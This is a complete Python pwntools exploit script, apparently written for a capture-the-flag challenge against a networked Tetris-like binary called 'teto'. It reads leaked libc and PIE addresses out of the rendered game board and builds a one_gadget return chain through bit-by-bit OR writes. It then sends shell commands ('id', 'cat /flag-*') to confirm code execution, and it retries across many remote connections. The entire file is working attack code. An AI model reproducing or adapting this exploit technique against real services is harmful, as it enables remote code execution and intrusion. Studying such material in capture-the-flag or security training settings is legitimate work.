#!/usr/bin/env python3
"""Fast batched IBT-safe exploit using the verified libc+0x583ec endgame."""

import __main__
import pickle
import socket
import threading
import time
import re
from pathlib import Path

from pwn import args, context, log, process, remote
from pwnlib.exception import PwnlibException

import exploit_agent as base
import fast_full_planner as fast
import remote_loop as old
import width14_fastbeam as width14

__main__.RoundPlan = fast.RoundPlan
__main__.Plan = width14.Plan

HOST = args.HOST or ""
PORT = int(args.PORT or 0)
MAIN_RET = 0x2A1CA
RESTART = 0x12BDCE
EPILOGUE = 0x17A28F
ONE_GADGET = 0x583EC
STANDARD = Path(__file__).with_name("full_main_schedule_repaired.pkl")
FINAL = Path(__file__).with_name("width14_final_5748.pkl")
INITIAL_WRITERS = (86, 93, 94, 99, 101, 103, 106, 109)
TOPOUT = b"d" * 100 + b" "


def changes(offset, old, new):
    if old & ~new:
        raise ValueError(f"OR cannot change {old:#x} into {new:#x}")
    value = new & ~old
    return [
        (offset + bit // 8, bit & 7)
        for bit in range(64) if value & (1 << bit)
    ]


def recv_early_width80(io, timeout=4):
    """Read only rows 0..8, then let the caller queue the next pieces."""
    data = bytearray()
    pattern = re.compile(rb"\|([.#@]{80})\|\n")
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        chunk = io.recv(timeout=min(0.2, deadline - time.monotonic()))
        if chunk:
            data += chunk
            if len(pattern.findall(data)) >= 9:
                return bytes(data), pattern.findall(data)[:9]
    raise ValueError("width-80 leak did not reach row 8")


def partial_qword(rows, offset):
    memory = {}
    for row_index, row in enumerate(rows):
        for byte_index in range(10):
            memory[row_index * 12 + byte_index] = sum(
                (row[byte_index * 8 + bit] == ord("#")) << bit
                for bit in range(8)
            )
    return int.from_bytes(
        bytes(memory.get(offset + index, 0) for index in range(8)), "little"
    )


def render_standard(sequence, plan, writes):
    assigned = dict(zip(plan.writers, writes))
    if len(assigned) != len(plan.writers):
        raise ValueError("standard round write mismatch")
    output = bytearray()
    for index in range(plan.start, plan.end):
        if index == plan.trigger:
            output += b"ddw"
        elif index == plan.high_width:
            output += b"d" * 11 + b"w"
        elif index in assigned:
            output += base.bit_write_command(*assigned[index])
        else:
            output += base.placement_command(
                sequence[index], *plan.placements[index]
            )
    output += TOPOUT
    return output


def render_width14(plan, writes):
    assigned = dict(zip(plan.writers, writes))
    if len(assigned) != len(plan.writers):
        raise ValueError("width14 final write mismatch")
    output = bytearray()
    for index in range(plan.start, plan.end):
        if index == plan.trigger:
            output += b"aaw"            # width 10 -> 14, stride remains 2
        elif index == plan.setup:
            output += b"w"              # width 14 -> 30
        elif index == plan.high_width:
            output += b"d" * 11 + b"w" # width 30 -> 0x801e
        elif index in assigned:
            output += base.bit_write_command(*assigned[index])
        else:
            output += plan.commands[index]
    output += TOPOUT
    return output


def start_target():
    if args.LOCAL:
        return process([
            str(base.LOADER), "--library-path", str(base.LIBDIR),
            str(base.BUNDLE / "teto"),
        ])
    if not HOST or not PORT:
        raise SystemExit("provide HOST=<host> PORT=<port>, or use LOCAL=1")
    return remote(HOST, PORT)


def exploit(number, sequence, first_plan, builds, final):
    io = start_target()
    base.drain(io, 0.06)
    io.send(b"".join(
        base.placement_command(sequence[i], *first_plan[i]) for i in range(79)
    ))
    base.drain(io, 0.06)
    # Lock both setup I pieces in one input burst. The resulting width-90
    # frame contains every address needed below. As soon as row 8 arrives,
    # queue pieces 81..85 so the active piece cannot auto-fall while the
    # remaining eleven rows are still crossing the socket.
    io.send(b"ddww")
    _, leak_rows = recv_early_width80(io)
    prelude = bytearray()
    for index in (81, 82):
        prelude += base.placement_command(sequence[index], *first_plan[index])
    prelude += b"d" * 11 + b"w"  # #83: high-width setup
    for index in (84, 85):
        prelude += base.placement_command(sequence[index], *first_plan[index])
    io.send(bytes(prelude))

    main_ret = partial_qword(leak_rows, 0x60)
    pie_ret = partial_qword(leak_rows, 0x40)
    call_main_rbp = partial_qword(leak_rows, 0x58)
    stage = call_main_rbp - 0xF8
    libc = main_ret - MAIN_RET
    pie = pie_ret - 0x2E69
    # LOCAL_LAYOUT keeps TCP transport (useful from Windows) while accepting
    # ordinary Linux ASLR instead of the remote jail's 2 MiB libc alignment.
    if not args.LOCAL and not args.LOCAL_LAYOUT and libc & 0x1FFFFF:
        raise ValueError(f"unexpected libc alignment {libc:#x}")

    restart = changes(0x60, main_ret, libc + RESTART)
    target = changes(0x150, 0, libc + ONE_GADGET)
    outer = changes(0x100, libc + 0x2A28B, libc + EPILOGUE)
    rbx_zero = changes(0x120, pie + 0x2E44, pie + 0x2EC4)
    if (len(restart), len(outer), len(rbx_zero)) != (5, 4, 1):
        raise ValueError(
            f"unexpected costs restart/outer/rbx="
            f"{len(restart)}/{len(outer)}/{len(rbx_zero)}"
        )
    # Keep the first restart compact. Very long first-game movements are prone
    # to a network gap before their terminating rotation; all target bits fit
    # in the later batched rounds for compatible ASLR layouts.
    capacity = sum(len(plan.writers) - 5 for plan in builds)
    if len(target) > capacity:
        raise ValueError(f"target needs {len(target)} bits, capacity={capacity}")
    log.success(
        f"attempt {number}: libc={libc:#x} pie={pie:#x} B={stage:#x} "
        f"target={len(target)}/{capacity}"
    )

    # The high address bit is the decisive jump from libc+0x2a5fe to the
    # restart epilogue. Duplicate it across all four late I pieces; a late
    # piece can occasionally fall once before its rotation reaches the peer.
    first_writes = restart[:4] + [restart[4]] * 4
    continuation = bytearray()
    first_map = dict(zip(INITIAL_WRITERS, first_writes))

    if args.FIRSTSTEP:
        for index in range(86, 110):
            if index in first_map:
                command = base.bit_write_command(*first_map[index])
            else:
                command = base.placement_command(
                    sequence[index], *first_plan[index]
                )
            log.info(f"first-step piece {index} kind={sequence[index]}")
            io.send(command)
            base.recv_complete_frame(io, 80, timeout=5)
        io.send(TOPOUT)
        data = io.recvuntil(b"GAME OVER", timeout=3)
        try:
            data += base.recv_complete_frame(io, 10, timeout=3)
        except (EOFError, ValueError):
            pass
        log.info(
            f"first-step output={len(data):,}, "
            f"game_overs={data.count(b'GAME OVER')}, connected={io.connected()}"
        )
        return io, data

    assigned = first_map
    for index in range(86, 110):
        if index in assigned:
            continuation += base.bit_write_command(*assigned[index])
        else:
            continuation += base.placement_command(
                sequence[index], *first_plan[index]
            )
    continuation += TOPOUT

    if args.FIRSTONLY:
        io.send(bytes(continuation))
        data = io.recvrepeat(float(args.WAIT or 5))
        log.info(
            f"first-only output={len(data):,}, "
            f"game_overs={data.count(b'GAME OVER')}, connected={io.connected()}"
        )
        return io, data

    # Re-set a bit of this round's already-patched return. This is much
    # shorter than moving an I out to B+0x150 for unused writer slots.
    filler = restart[0]
    for count, plan in enumerate(builds, 1):
        room = len(plan.writers) - 5
        data = target[:room]
        target = target[room:]
        writes = restart + data + [filler] * (room - len(data))
        continuation += render_standard(sequence, plan, writes)
        log.debug(f"round {count}: target bits left={len(target)}")
    if target:
        raise RuntimeError(f"target still needs {len(target)} bits")

    final_writes = restart + outer + rbx_zero
    if len(final.writers) != 10:
        raise ValueError(f"final has {len(final.writers)} writers, expected 10")
    continuation += render_width14(final, final_writes)
    flag_path = (args.FLAGPATH or "/flag-*").encode()
    continuation += b"echo REMOTE_PWNED; id; cat " + flag_path + b" 2>/dev/null\n"
    log.info(
        f"sending {len(continuation):,} bytes for {len(builds) + 2} "
        f"batched games"
    )
    chunks = []
    finished = threading.Event()

    def drain_output():
        deadline = time.monotonic() + float(args.WAIT or 18)
        while time.monotonic() < deadline and not finished.is_set():
            try:
                chunk = io.recv(timeout=0.1)
            except EOFError:
                break
            if chunk:
                chunks.append(chunk)
                if b"REMOTE_PWNED" in chunk:
                    # Keep reading briefly for id/flag output.
                    deadline = min(deadline, time.monotonic() + 1.0)

    reader = threading.Thread(target=drain_output, daemon=True)
    reader.start()
    send_error = None
    sender = io.sock.dup()
    sender.settimeout(float(args.WAIT or 18))
    try:
        sender.sendall(bytes(continuation))
    except (EOFError, OSError, PwnlibException) as error:
        send_error = error
    finally:
        sender.close()
    reader.join(float(args.WAIT or 18) + 0.5)
    finished.set()
    data = b"".join(chunks)
    log.info(
        f"remote output={len(data):,} bytes, "
        f"game_overs={data.count(b'GAME OVER')}, send_error={send_error!r}"
    )
    return io, data


def main():
    context.log_level = args.LOG_LEVEL or "info"
    if not STANDARD.exists() or not FINAL.exists():
        raise SystemExit("repaired standard schedule or width14 final is missing")
    with STANDARD.open("rb") as source:
        sequence, all_plans, _ = pickle.load(source)
    with FINAL.open("rb") as source:
        final = pickle.load(source)
    # The final begins where standard round 23 began; rounds 0..22 build it.
    builds = all_plans[:23]
    if final.start != builds[-1].end + 1:
        raise SystemExit(
            f"schedule discontinuity: builds end {builds[-1].end}, "
            f"final starts {final.start}"
        )
    first_plan = old.initial_plan(sequence)
    for number in range(1, int(args.CONNECTIONS or 12) + 1):
        started = time.monotonic()
        try:
            io, data = exploit(number, sequence, first_plan, builds, final)
            print(data.decode("latin-1", "replace")[-5000:])
            io.close()
            if b"REMOTE_PWNED" in data:
                return 0
        except (EOFError, ValueError, RuntimeError, PwnlibException) as error:
            log.warning(
                f"attempt {number} failed after "
                f"{time.monotonic() - started:.1f}s: {error}"
            )
    log.failure("all attempts failed")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
